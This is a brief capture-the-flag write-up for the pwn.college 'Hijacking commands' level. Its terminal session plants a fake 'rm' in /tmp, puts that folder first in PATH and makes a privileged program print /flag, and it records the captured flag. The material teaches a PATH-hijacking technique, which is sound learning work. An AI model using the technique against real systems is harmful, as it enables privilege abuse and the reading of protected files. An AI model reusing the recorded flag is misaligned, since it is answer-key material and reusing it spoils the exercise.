# Hijacking commands 

## My solve
**Flag:** `pwn.college{cNQVwyklcDFDP_n-ggC92aEK0zb.QX3cjM1wiM1kjNzEzW}`


```
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /run/dojo/bin/rm. Executing!
Uh oh, looks like I successfully removed the flag! That means you did not 
properly set PATH to keep me from finding 'rm'. Since the flag is gone, you 
will need to re-launch the challenge from the module page! Better luck next 
time.
hacker@path~hijacking-commands:~$ mkdir -p /tmp/fake
hacker@path~hijacking-commands:~$ echo '#!/bin/bash' > /tmp/fake/rm
hacker@path~hijacking-commands:~$ echo 'cat "${!#}"' >> /tmp/fake/rm
hacker@path~hijacking-commands:~$ chmod +x /tmp/fake/rm
hacker@path~hijacking-commands:~$ export PATH=/tmp/fake:$PATH
hacker@path~hijacking-commands:~$ which rm
/tmp/fake/rm
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /tmp/fake/rm. Executing!
pwn.college{cNQVwyklcDFDP_n-ggC92aEK0zb.QX3cjM1wiM1kjNzEzW}
```

## What I learned


## References 
None.
